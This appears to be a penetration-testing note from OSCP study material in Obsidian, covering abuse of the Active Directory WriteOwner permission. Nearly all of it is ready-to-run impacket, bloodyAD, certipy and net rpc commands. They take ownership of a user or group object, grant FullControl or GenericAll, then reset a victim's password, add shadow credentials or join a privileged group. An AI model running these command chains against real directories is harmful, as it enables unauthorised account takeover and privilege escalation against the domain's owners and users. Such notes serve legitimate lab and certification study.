You can change the ownership of the object.
# User

The workflow is:
1. Make yourself the owner.
2. Give yourself FullControl using `dacledit`.
3. Abuse the resulting permissions.

`WriteOwner → FullControl → Password Reset`

**Step 1 — Change ownership**
```
impacket-owneredit -action write -new-owner alice -target bob 'corp.local/alice:Password123!' -dc-ip 10.10.10.10
```

**Step 2 — Give yourself FullControl**
```
impacket-dacledit -action write -rights FullControl -principal alice -target bob 'corp.local/alice:Password123!' -dc-ip 10.10.10.10
```

**Step 3 — Reset Bob's password**
```
impacket-changepasswd -reset -protocol smb-samr 'corp.local/bob@[ip]' -newpass 'NewPassword123!' -altuser 'corp.local/{AdminUser}' -altpass '{AdminPW}'
```

OR

**Step 3 — Add a shadow credential**
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `certipy-ad shadow auto -u [adminUser]@${discoveredDomain} -p [adminPW] -account '[targetUser]' -dc-ip DCIP`;

dv.paragraph("```bash\n" + command + "\n```");
```
## Alternative bloodAD cmds

#### Change Account Owner
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const ip = page?.IP ?? "NO IP FOUND";

const command = `bloodyAD -d ${discoveredDomain} --host DCIP -u [adminUser] -p [adminPW] set owner [targetAccountName] [AdminAccountName]`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### Give GenericAll
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const ip = page?.IP ?? "NO IP FOUND";

const command = `bloodyAD -d ${discoveredDomain} --host DCIP -u [adminUser] -p [adminPW] add genericAll [targetUser] [adminUser]`;

dv.paragraph("```bash\n" + command + "\n```");
```
---
# Group

Add user to this group
#### Modify owner
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `impacket-owneredit -action write -new-owner [adminUser] -target [groupName] ${discoveredDomain}/[adminUser]:[adminPW] -dc-ip ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### Modify Rights
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `impacket-dacledit -action 'write' -rights 'WriteMembers' -principal [adminUser] -target [groupName] '${discoveredDomain}'/'[adminUser]':'[adminPW]' -dc-ip DCIP`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### Add to group
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `net rpc group addmem [group] [adminUser] -U "${discoveredDomain}"/"[adminUser]"%"[adminPW]" -S ${ip}`

dv.paragraph("```bash\n" + command + "\n```");
```
#### Check group members
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `net rpc group members [group] -U "${discoveredDomain}"/"[adminUser]"%"[adminPW]" -S ${ip}`

dv.paragraph("```bash\n" + command + "\n```");
```

## BloodAD Alternative

### **Step 1 — Take ownership of the group**
```
bloodyAD -d EXAMPLE.COM --host <DC_IP> \
-u [adminUser] -p '[adminPW]' \
set owner 'TargetGroup' '[adminUser]'
```
### **Step 2 — Grant yourself GenericAll over the group**
```
bloodyAD -d EXAMPLE.COM --host <DC_IP> \
-u [adminUser] -p '[adminPW]' \
add genericAll 'TargetGroup' '[adminUser]'
```
### **Step 3 — Add yourself to the group**
```
bloodyAD -d EXAMPLE.COM --host <DC_IP> \
-u [adminUser] -p '[adminPW]' \
add groupMember 'TargetGroup' '[adminUser]'
```